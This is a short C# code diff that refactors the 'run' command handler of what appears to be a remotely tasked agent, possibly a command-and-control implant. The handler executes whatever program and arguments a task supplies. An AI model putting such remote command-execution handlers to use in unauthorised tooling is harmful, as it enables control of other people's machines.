@@ -11,11 +11,11 @@ namespace Agent.Commands
     public class RunCommand : AgentCommand
     {
         public override string Name => "run";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             var filename = task.SplittedArgs[0];
             string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();
-            result.Result = Executor.ExecuteCommand(filename, args);
+            context.Result.Result = Executor.ExecuteCommand(filename, args);
         }
     }
 }
